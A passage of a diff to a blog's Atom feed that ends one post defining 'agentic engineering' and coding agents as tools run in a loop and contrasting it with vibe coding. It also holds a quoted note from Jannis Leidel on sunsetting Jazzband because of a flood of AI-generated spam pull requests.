+    &lt;p&gt;I use the term &lt;strong&gt;agentic engineering&lt;/strong&gt; to describe the practice of developing software with the assistance of coding agents.&lt;/p&gt;
+&lt;p&gt;What are &lt;strong&gt;coding agents&lt;/strong&gt;? They're agents that can both write and execute code. Popular examples include &lt;a href="https://code.claude.com/"&gt;Claude Code&lt;/a&gt;, &lt;a href="https://openai.com/codex/"&gt;OpenAI Codex&lt;/a&gt;, and &lt;a href="https://geminicli.com/"&gt;Gemini CLI&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;What's an &lt;strong&gt;agent&lt;/strong&gt;? Clearly defining that term is a challenge that has frustrated AI researchers since &lt;a href="https://simonwillison.net/2024/Oct/12/michael-wooldridge/"&gt;at least the 1990s&lt;/a&gt; but the definition I've come to accept, at least in the field of Large Language Models (LLMs) like GPT-5 and Gemini and Claude, is this one:&lt;/p&gt;
+&lt;p&gt;&lt;center&gt;&lt;strong&gt;Agents run tools in a loop to achieve a goal&lt;/strong&gt;&lt;/center&gt;&lt;/p&gt;
+
+&lt;p&gt;The "agent" is software that calls an LLM with your prompt and passes it a set of tool definitions, then calls any tools that the LLM requests and feeds the results back into the LLM.&lt;/p&gt;
+&lt;p&gt;For coding agents, those tools include one that can execute code.&lt;/p&gt;
+&lt;p&gt;You prompt the coding agent to define a goal. The agent then generates and executes code in a loop until that goal has been met.&lt;/p&gt;
+&lt;p&gt;Code execution is the defining capability that makes agentic engineering possible. Without the ability to directly run the code, anything output by an LLM is of limited value. With code execution, these agents can start iterating towards software that demonstrably works.&lt;/p&gt;
+&lt;h2 id="agentic-engineering"&gt;Agentic engineering&lt;/h2&gt;
+&lt;p&gt;Now that we have software that can write working code, what is there left for us humans to do?&lt;/p&gt;
+&lt;p&gt;The answer is &lt;em&gt;so much stuff&lt;/em&gt;.&lt;/p&gt;
+&lt;p&gt;Writing code has never been the sole activity of a software engineer. The craft has always been figuring out &lt;em&gt;what&lt;/em&gt; code to write. Any given software problem has dozens of potential solutions, each with their own tradeoffs. Our job is to navigate those options and find the ones that are the best fit for our unique set of circumstances and requirements.&lt;/p&gt;
+&lt;p&gt;Getting great results out of coding agents is a deep subject in its own right, especially now as the field continues to evolve at a bewildering rate.&lt;/p&gt;
+&lt;p&gt;We need to provide our coding agents with the tools they need to solve our problems, specify those problems in the right level of detail, and verify and iterate on the results until we are confident they address our problems in a robust and credible way.&lt;/p&gt;
+&lt;p&gt;LLMs don't learn from their past mistakes, but coding agents can, provided we deliberately update our instructions and tool harnesses to account for what we learn along the way.&lt;/p&gt;
+&lt;p&gt;Used effectively, coding agents can help us be much more ambitious with the projects we take on. Agentic engineering should help us produce more, better quality code that solves more impactful problems.&lt;/p&gt;
+&lt;h2 id="isnt-this-just-vibe-coding"&gt;Isn't this just vibe coding?&lt;/h2&gt;
+&lt;p&gt;The term "vibe coding" was &lt;a href="https://twitter.com/karpathy/status/1886192184808149383"&gt;coined by Andrej Karpathy&lt;/a&gt; in February 2025 - coincidentally just three weeks prior to the original release of Claude Code - to describe prompting LLMs to write code while you "forget that the code even exists".&lt;/p&gt;
+&lt;p&gt;Some people extend that definition to cover any time an LLM is used to produce code at all, but I think that's a mistake. Vibe coding is more useful in its original definition - we need a term to describe unreviewed, prototype-quality LLM-generated code that distinguishes it from code that the author has brought up to a production ready standard.&lt;/p&gt;
+&lt;h2 id="about-this-guide"&gt;About this guide&lt;/h2&gt;
+&lt;p&gt;Just like the field it attempts to cover, &lt;em&gt;Agentic Engineering Patterns&lt;/em&gt; is very much a work in progress. My goal is to identify and describe patterns for working with these tools that demonstrably get results, and that are unlikely to become outdated as the tools advance.&lt;/p&gt;
+&lt;p&gt;I'll continue adding more chapters as new techniques emerge. No chapter should be considered finished. I'll be updating existing chapters as our understanding of these patterns evolves.&lt;/p&gt;
+    
+        &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/coding-agents"&gt;coding-agents&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/agent-definitions"&gt;agent-definitions&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/generative-ai"&gt;generative-ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/agentic-engineering"&gt;agentic-engineering&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai"&gt;ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llms"&gt;llms&lt;/a&gt;&lt;/p&gt;
+    
+
+</summary><category term="coding-agents"/><category term="agent-definitions"/><category term="generative-ai"/><category term="agentic-engineering"/><category term="ai"/><category term="llms"/></entry><entry><title>Quoting Jannis Leidel</title><link href="https://simonwillison.net/2026/Mar/14/jannis-leidel/#atom-everything" rel="alternate"/><published>2026-03-14T18:41:25+00:00</published><updated>2026-03-14T18:41:25+00:00</updated><id>https://simonwillison.net/2026/Mar/14/jannis-leidel/#atom-everything</id><summary type="html">
+    &lt;blockquote cite="https://jazzband.co/news/2026/03/14/sunsetting-jazzband"&gt;&lt;p&gt;GitHub’s &lt;a href="https://www.theregister.com/2026/02/18/godot_maintainers_struggle_with_draining/"&gt;slopocalypse&lt;/a&gt; – the flood of AI-generated spam PRs and issues – has made Jazzband’s model of open membership and shared push access untenable.&lt;/p&gt;
+&lt;p&gt;Jazzband was designed for a world where the worst case was someone accidentally merging the wrong PR. In a world where &lt;a href="https://www.devclass.com/ai-ml/2026/02/19/github-itself-to-blame-for-ai-slop-prs-say-devs/4091420"&gt;only 1 in 10 AI-generated PRs meets project standards&lt;/a&gt;, where curl had to &lt;a href="https://daniel.haxx.se/blog/2026/01/26/the-end-of-the-curl-bug-bounty/"&gt;shut down its bug bounty&lt;/a&gt; because confirmation rates dropped below 5%, and where GitHub’s own response was a &lt;a href="https://www.theregister.com/2026/02/03/github_kill_switch_pull_requests_ai"&gt;kill switch to disable pull requests entirely&lt;/a&gt; – an organization that gives push access to everyone who joins simply can’t operate safely anymore.&lt;/p&gt;&lt;/blockquote&gt;
+&lt;p class="cite"&gt;&amp;mdash; &lt;a href="https://jazzband.co/news/2026/03/14/sunsetting-jazzband"&gt;Jannis Leidel&lt;/a&gt;, Sunsetting Jazzband&lt;/p&gt;
+
+    &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/ai-ethics"&gt;ai-ethics&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/open-source"&gt;open-source&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/python"&gt;python&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai"&gt;ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/github"&gt;github&lt;/a&gt;&lt;/p&gt;
+
+
+
+</summary><category term="ai-ethics"/><category term="open-source"/><category term="python"/><category term="ai"/><category term="github"/></entry></feed>
